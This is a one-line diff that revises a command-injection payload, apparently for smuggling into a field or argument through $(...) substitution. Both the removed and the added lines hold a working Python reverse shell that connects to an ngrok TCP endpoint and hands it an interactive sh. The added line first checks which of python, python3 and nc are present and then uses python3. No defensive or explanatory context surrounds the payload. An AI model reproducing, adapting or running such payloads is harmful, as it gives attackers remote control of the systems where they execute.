@@ -1,1 +1,1 @@
-$(export RHOST="6.tcp.eu.ngrok.io";export RPORT=15484;/usr/bin/python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")')
+$(which python; which python3; which nc; export RHOST="6.tcp.eu.ngrok.io";export RPORT=15484;/usr/bin/python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")')
